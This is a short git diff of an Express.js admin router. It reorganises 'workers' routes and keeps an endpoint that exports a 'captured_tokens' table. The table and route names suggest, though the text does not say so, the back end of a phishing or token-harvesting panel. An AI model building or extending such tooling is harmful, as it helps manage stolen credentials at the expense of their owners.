@@ -298,6 +298,11 @@ router.get('/workers/:id/logs', adminAuth, async (req, res) => {
   res.json(logs);
 });
 
+router.delete('/workers/:id', adminAuth, async (req, res) => {
+  await db.query("UPDATE links SET status = 'disabled' WHERE id = ?", [req.params.id]);
+  res.json({ success: true });
+});
+
 // --- Templates management (admin) ---
 router.get('/templates', adminAuth, async (req, res) => {
   const [templates] = await db.query('SELECT * FROM templates ORDER BY name ASC');
@@ -616,22 +621,6 @@ router.delete('/tokens/:id', adminAuth, async (req, res) => {
 router.get('/tokens/export', adminAuth, async (req, res) => {
   const [tokens] = await db.query('SELECT * FROM captured_tokens ORDER BY created_at DESC');
   res.json(tokens);
-});
-
-// In admin.js routes:
-router.get('/workers', adminAuth, async (req, res) => {
-  const [links] = await db.query('SELECT l.*, u.login_key FROM links l JOIN users u ON l.user_id = u.id ORDER BY l.created_at DESC');
-  res.json(links);
-});
-
-router.delete('/workers/:id', adminAuth, async (req, res) => {
-  await db.query("UPDATE links SET status = 'disabled' WHERE id = ?", [req.params.id]);
-  res.json({ success: true });
-});
-
-router.get('/workers/:id/logs', adminAuth, async (req, res) => {
-  const [logs] = await db.query('SELECT * FROM deployment_logs WHERE link_id = ? ORDER BY created_at DESC LIMIT 100', [req.params.id]);
-  res.json(logs);
 });
 
 module.exports = router;
